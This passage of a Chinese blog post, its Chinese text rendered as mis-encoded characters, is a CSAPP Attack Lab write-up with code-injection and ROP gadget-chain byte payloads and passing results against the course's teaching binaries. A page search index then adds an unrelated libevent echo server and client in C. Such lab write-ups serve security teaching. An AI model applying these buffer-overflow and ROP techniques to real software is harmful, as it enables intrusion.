<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o

asscode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 93 dc 61 55    mov    $0x5561dc93,%rdi
   7:   48 83 ec 28             sub    $0x28,%rsp
   b:   68 fa 18 40 00          pushq  $0x4018fa
  10:   c3                      retq
</code></pre>
<h3 id="æœ€ç»ˆå†™å‡ºå…¥ä¾µå­—ä¸²">æœ€ç»ˆå†™å‡ºå…¥ä¾µå­—ä¸²</h3>
<pre><code>48 c7 c7 93 dc 61 55 48 83 ec 28 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00  78 dc 61 55
</code></pre>
<h3 id="é€šè¿‡">é€šè¿‡ï¼ï¼ï¼</h3>
<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit3-raw.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3(&quot;59b997fa&quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 93 DC 61 55 48 83 EC 28 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 78 DC 61 55
</code></pre>
<h2 id="rtarget">rtarget</h2>
<h3 id="1">1</h3>
<p>rtargetè¦æ±‚æˆ‘ä»¬è¿›è¡ŒROPæ”»å‡»ï¼Œå› ä¸ºæ ˆéšæœºåŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åƒä¹‹å‰ä¸€æ ·æŒ‡å®šåœ°å€ï¼Œåªèƒ½ä¾é ä»£ç ä¸­åŸæœ‰çš„gadgetè¿›è¡Œå…¥ä¾µã€‚<br>
æˆ‘çš„æƒ³æ³•æ˜¯å…ˆæŠŠcookie popåˆ°æŸä¸ªå¯„å­˜å™¨ä¸­ï¼Œç„¶åå†movåˆ°rdié‡Œé¢ã€‚<br>
å‚è€ƒäº†å®éªŒæ‰‹å†Œï¼Œæ£€ç´¢äº†framéƒ¨åˆ†çš„ä»£ç åå‘ç°åªæœ‰ <code>58</code>Â å¯ä»¥ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯ <code>popq %rax</code>Â <br>
<img src="http://static.yulan.net.cn/image/_74f7a02a83c7342936036627bf6b81df.png" alt="" loading="lazy"><br>
ç„¶åå¯»æ‰¾åˆ°ä¸€æ®µ <code>movq %rax,%rdi</code>Â çš„æŒ‡ä»¤ã€‚<br>
<img src="http://static.yulan.net.cn/image/_519414af020393b2e70643e9fd7c701e.png" alt="" loading="lazy"><br>
è¿™ä¸¤ä¸ªå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨çš„gaggetï¼Œåœ°å€åˆ†åˆ«æ˜¯ <code>0x4019ab</code>Â å’ŒÂ· <code>0x4019a2</code>ã€‚<br>
å°†ä»–ä»¬è¿ç»­æ‰§è¡Œå°±ä¼šæ˜¯å¦‚ä¸‹æƒ…å½¢ï¼š</p>
<pre><code>popq %rax
nop
ret
movq %rax,%rdi
ret
</code></pre>
<p>æˆ‘ä»¬åªç”¨å‡†å¤‡å¥½popå‡ºçš„æ•°æ®å’Œè¿”å›ä½ç½®å³å¯ã€‚<br>
è¿™é‡Œè¦æ³¨æ„æ ˆæ˜¯å‘é«˜å­—èŠ‚æ”¶ç¼©ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠæˆ‘ä»¬çš„æ’å…¥ç‰‡æ®µæ”¾åœ¨40å­—èŠ‚ç¼“å†²åŒºåé¢ã€‚<br>
åº”è¯¥æ’å…¥çš„ä»£ç å¦‚ä¸‹</p>
<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
</code></pre>
<p>å‰40ä¸ªå­—èŠ‚æ²¡æœ‰å®é™…æ„ä¹‰ï¼Œåé¢æŒ‡å®šè¿”å›åœ°å€ä¸å‡†å¤‡popå‡ºçš„æ•°æ®</p>
<h3 id="2">2</h3>
<p>æœ‰äº›å¤æ‚ï¼Œç›´æ¥è´´å‡ºæ¥äº†</p>
<pre><code>35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00            06 1a 40 00 00 00 00 00            /* mov %rsp,%rax */
a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */

ab 19 40 00 00 00 00 00            /* pop %rax */
48 00 00 00 00 00 00 00

dd 19 40 00 00 00 00 00            /* mov %eax,%edx */
70 1a 40 00 00 00 00 00            /* mov %edx,%ecx */
13 1a 40 00 00 00 00 00            /* mov %ecx,%esi */
d6 19 40 00 00 00 00 00            /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61            /* cookie string */
00 00 00 00 00 00 00 00
</code></pre>

            </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">æœ¬æ–‡ä½œè€…ï¼š</strong>
      è¯­é˜‘gz
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">æœ¬æ–‡é“¾æ¥ï¼š</strong>
      <a href="https://yulan.net.cn/post/uscxh7_ainkg2/" title="CSAPP: Attacklab">https://yulan.net.cn/post/uscxh7_ainkg2/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">ç‰ˆæƒå£°æ˜ï¼š </strong>
      æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
    </li>
  </ul>
  <div class="tags">
    
      <a href="https://yulan.net.cn/tag/Gr1xnj72j/"># CSAPP</a>
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="CSAPP: cachelab" href="https://yulan.net.cn/post/uscxh7_mezrog/">CSAPP: cachelab</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="CSAPP: cachelab" href="https://yulan.net.cn/post/uscxh7_mezrog/">ä¸Šä¸€ç¯‡</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="CSAPP: Bomblab" href="https://yulan.net.cn/post/uscxh7_qulnpm/">CSAPP: Bomblab</a>
        <a class="nav-mobile-next" title="CSAPP: Bomblab" href="https://yulan.net.cn/post/uscxh7_qulnpm/">ä¸‹ä¸€ç¯‡</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <span id="busuanzi_container_site_pv">æµè§ˆæ•° <span id="busuanzi_value_site_pv"></span> æ¬¡</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">è®¿å®¢æ•° <span id="busuanzi_value_site_uv"></span> äºº</span>
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> Â©2019 | Theme By <a
        href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      <div style="width:600px;margin:0 0; padding:0 0;">
    <a target="_blank" href="http://beian.miit.gov.cn" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
        <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 0px;">é„‚ICPå¤‡20002184å·</p>
    </a>
    <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010502001237" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
        <img src="/images/beian.png" style="float:left;" />
        <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 0px;">é„‚å…¬ç½‘å®‰å¤‡ 42010502001237å·</p>
    </a>
</div>
    </div>
  </footer>
  
  
  <div class="gemini back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
  <div class="bg-img">
    <img src="/media/images/background.jpg" />
  </div>
  
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
    back2TopText = document.querySelector('#back_to_top_text'),
    drawerBox = document.querySelector('#drawer_box'),
    rightSideBar = document.querySelector('.sidebar'),
    viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {

    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener('scroll', function (e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });


  let hasCacu = false;
  window.addEventListener('resize', function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // åŠ¨æ€è°ƒæ•´ç«™ç‚¹æ¦‚è§ˆé«˜åº¦
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, 'stop');
      jQuery.Velocity(viewport, 'stop');
      jQuery.Velocity(rightMotions, 'stop');
      if (open) {
        jQuery.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function () {
            jQuery.Velocity(rightMotions, transitionDir, {});
          }
        })
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME
        });
      } else {
        jQuery.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function () {
            jQuery.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // é“¾æ¥è·³è½¬
  let newWindow = 'false'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target", "_blank");
      }
    })
  }

  let faSearch = document.querySelector('#fa_search');
  faSearch && faSearch.addEventListener('click', function () {
    document.querySelector('#search_mask').style = ''
  })

  // ä»£ç é«˜äº®
  hljs.initHighlightingOnLoad();
  
  // ç¦»å¼€å½“å‰é¡µtitleå˜åŒ–
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState == 'hidden') {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }

</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll('.section img');
  images.forEach(image => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement('a');
    aelem.href = image.src;
    aelem.dataset['fancybox'] = 'images';
    aelem.dataset['rel'] = 'fancybox-button';
    aelem.classList.add('fancybox');
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  })
</script>

    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>æ„Ÿè°¢æ‚¨çš„æ”¯æŒï¼Œæˆ‘ä¼šç»§ç»­åŠªåŠ›çš„!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">æ‰«ç æ‰“èµï¼Œä½ è¯´å¤šå°‘å°±å¤šå°‘</p>
      <p class="reward-tip">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«ï¼Œå³å¯è¿›è¡Œæ‰«ç æ‰“èµå“¦</p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        jQuery.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        jQuery.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        jQuery.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        jQuery.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      jQuery.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      jQuery.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

<div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="æœç´¢">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">æ¡ç›¸å…³æ¡ç›®ï¼Œä½¿ç”¨äº†</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">æ¯«ç§’</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/about/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;æ¬¢è¿æ¥åˆ°æˆ‘çš„å°ç«™å‘€ï¼Œå¾ˆé«˜å…´é‡è§ä½ ï¼ğŸ¤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;å…³äºæœ¬ç«™&#34;&gt;ğŸ  å…³äºæœ¬ç«™&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;æœ¬ç«™çš„åˆ›ä½œå†…å®¹å…¨éƒ¨æ¥æºäº&lt;a href=&#34;https://www.yuque.com/yulan-updh1&#34;&gt;æˆ‘çš„è¯­é›€çŸ¥è¯†åº“&lt;/a&gt;ï¼Œæ¬¢è¿å¤§å®¶è®¿é—®&lt;/li&gt;
&lt;li&gt;æˆ‘çš„åˆ›ä½œé€šå¸¸ä¼šç¬¬ä¸€æ—¶é—´å‘å¸ƒåˆ°è¯­é›€ä¸Šï¼Œå› æ­¤è¯­é›€ä¸­ä¹Ÿä¼šåŒ…å«å¾ˆå¤šæœªåˆ†ç±»çš„ã€è‰ç¨¿æ€§è´¨çš„æ–‡ç« &lt;/li&gt;
&lt;li&gt;æ¯éš”ä¸€å®šæ—¶é—´ï¼Œæˆ‘ä¼šå°†è¯­é›€ä¸Šæˆ‘è®¤ä¸ºä¼˜è´¨çš„å†…å®¹åŒæ­¥åˆ°æœ¬ç«™&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;è”ç³»æˆ‘å‘€&#34;&gt;ğŸ“¬ è”ç³»æˆ‘å‘€&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;mailto:1301481108@qq.com&#34;&gt;1301481108@qq.com&lt;/a&gt;&lt;/p&gt;
">å…³äº</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xdsvqq_rga2qz/"" data-c="
          &lt;h2 id=&#34;æœåŠ¡ç«¯&#34;&gt;æœåŠ¡ç«¯&lt;/h2&gt;
&lt;h3 id=&#34;severec&#34;&gt;severe.c&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// severe.c

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;event2/event.h&amp;gt;
#include &amp;lt;event2/listener.h&amp;gt;
#include &amp;lt;event2/bufferevent.h&amp;gt;
#include &amp;quot;callbacks.h&amp;quot;

int main()
{
    // åˆ›å»ºevent base
    struct event_base* base = NULL;
    base = event_base_new();
    if(base == NULL){
        perror(&amp;quot;event base new error&amp;quot;);
        exit(1);
    }

    // å¡«å†™å¥—æ¥å­—åœ°å€
    struct sockaddr_in saddr;
    memset(&amp;amp;saddr,0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(9999);
    saddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // åˆ›å»ºlistern_cbå›è°ƒå‡½æ•°çš„å‚æ•°
    struct CallBackArgs* args = malloc(sizeof(struct CallBackArgs));
    args-&amp;gt;base = base;

    // ç”³è¯·å¥—æ¥å­—ã€ç»‘å®šã€ç›‘å¬
    struct evconnlistener* evl = NULL;
    evl = evconnlistener_new_bind(base,
                                  listen_cb,
                                  (void *)args,
                                  LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE,
                                  -1,
                                  (struct sockaddr*)&amp;amp;saddr,
                                  sizeof(saddr));
    if (evl == NULL){
        perror(&amp;quot;event listener new bind error&amp;quot;);
        exit(1);
    }

    // å¼€å§‹è¿è¡Œ
    int code;
    code = event_base_dispatch(base);
    if(code == -1){
        perror(&amp;quot;event base dispatch error&amp;quot;);
        exit(1);
    }

    // èµ„æºå…³é—­
    evconnlistener_free(evl);
    free(args);
    event_base_free(base);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;callbacksh&#34;&gt;callbacks.h&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// callbacks.h

#ifndef CLIBEVENT_CALLBACKS_H
#define CLIBEVENT_CALLBACKS_H

#include &amp;lt;event2/event.h&amp;gt;
#include &amp;lt;event2/listener.h&amp;gt;
#include &amp;lt;event2/bufferevent.h&amp;gt;

/* è‡ªå®šä¹‰å›è°ƒå‚æ•°æ•°æ®ç»“æ„ */
struct CallBackArgs
{
    struct event_base* base;
};

/** ç›‘å¬listenå›è°ƒå‡½æ•°
 * type: evconnlistener_cb
 * */
void listen_cb(struct evconnlistener * evl, evutil_socket_t fd, struct sockaddr * caddr,
               int socklen, void * args);

/**
   readå›è°ƒå‡½æ•°
   type: bufferevent_data_cb
*/
void read_cb(struct bufferevent *bfev, void *args);

/**
 * writeå›è°ƒå‡½æ•°
 * type: bufferevent_data_cb
 * */
void write_cb(struct bufferevent *bfev, void *args);

/**
 * eventå›è°ƒå‡½æ•°
 * type: bufferevent_event_cb
 * */
void event_cb(struct bufferevent *bfev, short what, void *args);

#endif //CLIBEVENT_CALLBACKS_H

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;callbacksc&#34;&gt;callbacks.c&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// callbacks.c

#include &amp;quot;callbacks.h&amp;quot;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;ctype.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
void listen_cb(struct evconnlistener * evl, evutil_socket_t fd, struct sockaddr * caddr,
        int socklen, void * args)
{
    // è·å–å‚æ•°
    struct CallBackArgs* cb_args = (struct CallBackArgs*) args;

    // åˆ›å»ºbuffer event
    struct bufferevent* bfev = NULL;
    bfev = bufferevent_socket_new(cb_args-&amp;gt;base,fd,BEV_OPT_CLOSE_ON_FREE);
    if(bfev == NULL){
        perror(&amp;quot;buffer socket new error&amp;quot;);
        return;
    }

    // å¯ç”¨è¯»å†™äº‹ä»¶
    int code;
    code = bufferevent_enable(bfev,EV_READ | EV_WRITE);
    if(code == -1){
        perror(&amp;quot;buffer event enable error&amp;quot;);
        bufferevent_free(bfev);
        return;
    }

    // æ³¨å†Œå›è°ƒå‡½æ•°
    bufferevent_setcb(bfev,
                      read_cb,
                      write_cb,
                      event_cb,
                      NULL);
}

void read_cb(struct bufferevent *bfev, void *args)
{
    //æ¥æ”¶æ•°æ®
    char buff[1024] = {0};
    int len = bufferevent_read(bfev,buff, sizeof(buff));
    printf(&amp;quot;æ¥æ”¶åˆ°äº†æ•°æ®:%s&amp;quot;,buff);

    // å¤„ç†æ•°æ®
    int i;
    for(i = 0;i&amp;lt;len ;++i){
        buff[i] = toupper(buff[i]);
    }

    // å‘é€æ•°æ®
    int code;
    code = bufferevent_write(bfev,buff, strlen(buff)+1);
    if(code == -1){
        perror(&amp;quot;buffer write error&amp;quot;);
        return;
    }
    printf(&amp;quot;æˆ‘å‘å›äº†æ•°æ®:%s&amp;quot;,buff);
}

void write_cb(struct bufferevent *bfev, void *args)
{
    printf(&amp;quot;æˆ‘çš„æ•°æ®å‘é€å®Œæ¯•\n&amp;quot;);
}

void event_cb(struct bufferevent *bfev, short what, void *args)
{
    // å‡ºç°é”™è¯¯ï¼Œé‡Šæ”¾èµ„æºï¼Œä¸åšé¢å¤–å¤„ç†
    if(args)
        free(args);
    bufferevent_free(bfev);
    printf(&amp;quot;å…³é—­ buffer event\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å®¢æˆ·ç«¯&#34;&gt;å®¢æˆ·ç«¯&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// å‘é€ä¸€æ¬¡æ•°æ®å¹¶å—åˆ°æœåŠ¡å™¨è¿”å›åå°±é€€å‡ºeventå¾ªç¯ï¼Œç»“æŸç¨‹åº

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;event2/event.h&amp;gt;
#include &amp;lt;event2/bufferevent.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;

void read_cb(struct bufferevent *bfev, void *args)
{
    char buff[1024] = {0};
    int len = bufferevent_read(bfev, buff, sizeof(buff));
    printf(&amp;quot;ä»æœåŠ¡å™¨æ¥æ”¶åˆ°äº†æ•°æ®:%s&amp;quot;, buff);
    bufferevent_free(bfev);
}

void write_cb(struct bufferevent *bfev, void *args)
{
    printf(&amp;quot;æ•°æ®å·²å‘é€&amp;quot;);
}

void event_cb(struct bufferevent *bfev, short what, void *args)
{
    if (what &amp;amp; BEV_EVENT_CONNECTED)
    {
        printf(&amp;quot;è¿æ¥å»ºç«‹å®Œæˆ\n&amp;quot;);
        return;
    }

    if (what &amp;amp; BEV_EVENT_ERROR)
    {
        printf(&amp;quot;å‡ºç°é”™è¯¯äº‹ä»¶\n&amp;quot;);
        perror(&amp;quot;&amp;quot;);
        if (args != NULL)
            free(args);
        bufferevent_free(bfev);
        exit(1);
    }
    if (what &amp;amp; BEV_EVENT_EOF)
    {
        printf(&amp;quot;è¿æ¥å·²æ–­å¼€\n&amp;quot;);
        if (args != NULL)
            free(args);
        bufferevent_free(bfev);
        exit(0);
    }
}

void std_cb(evutil_socket_t fd, short what, void *sock_bev)
{
    char buff[1024] = {0};
    int len = read(fd, buff, sizeof(buff));
    struct bufferevent *bev = (struct bufferevent *)sock_bev;
    int code;
    code = bufferevent_write(bev, buff, strlen(buff) + 1);
    if (code == -1)
    {
        perror(&amp;quot;write to buffer event error&amp;quot;);
        exit(1);
    }
}

int main()
{
    struct event_base *base = NULL;
    base = event_base_new();
    if (base == NULL)
    {
        perror(&amp;quot;base new error&amp;quot;);
        exit(1);
    }

    // è¦è¿æ¥çš„æœåŠ¡å™¨ä¿¡æ¯
    struct sockaddr_in serv;
    memset(&amp;amp;serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_port = htons(9999);
    inet_pton(AF_INET, &amp;quot;127.0.0.1&amp;quot;, &amp;amp;serv.sin_addr.s_addr);

    // åˆ›å»ºå¥—æ¥å­—
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd &amp;lt; 0)
    {
        perror(&amp;quot;create socket erroe&amp;quot;);
        exit(1);
    }
    printf(&amp;quot;å¥—æ¥å­—åˆ›å»ºå®Œæˆ\n&amp;quot;);
    // åˆ›å»ºæœ¬æ¬¡é€šä¿¡çš„bufferevent
    struct bufferevent *bev = NULL;
    bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);

    int code;
    code = bufferevent_socket_connect(bev, (struct sockaddr *)&amp;amp;serv, sizeof(serv));
    if (code == -1)
    {
        perror(&amp;quot;connect error&amp;quot;);
        exit(1);
    }

    bufferevent_setcb(bev, read_cb, write_cb, event_cb, NULL);

    code = bufferevent_enable(bev, EV_READ | EV_WRITE);
    if (code == -1)
    {
        perror(&amp;quot;enable error&amp;quot;);
        exit(1);
    }

    // åˆ›å»ºstdè¾“å…¥äº‹ä»¶
    struct event *ev = NULL;
    ev = event_new(base, STDIN_FILENO, EV_READ, std_cb, (void *)bev);
    if (ev == NULL)
    {
        perror(&amp;quot;åˆ›å»ºstd event error&amp;quot;);
        exit(1);
    }

    code = event_add(ev, NULL);
    if (code == -1)
    {
        perror(&amp;quot;event add error&amp;quot;);
        exit(1);
    }
    // å¼€å§‹è¿è¡Œ
    code = event_base_dispatch(base);
    if (code == -1)
    {
        perror(&amp;quot;dispatch error&amp;quot;);
        exit(1);
    }
    //printf(&amp;quot;event base start\n&amp;quot;);

    event_base_free(base);
    printf(&amp;quot;event base free\n&amp;quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
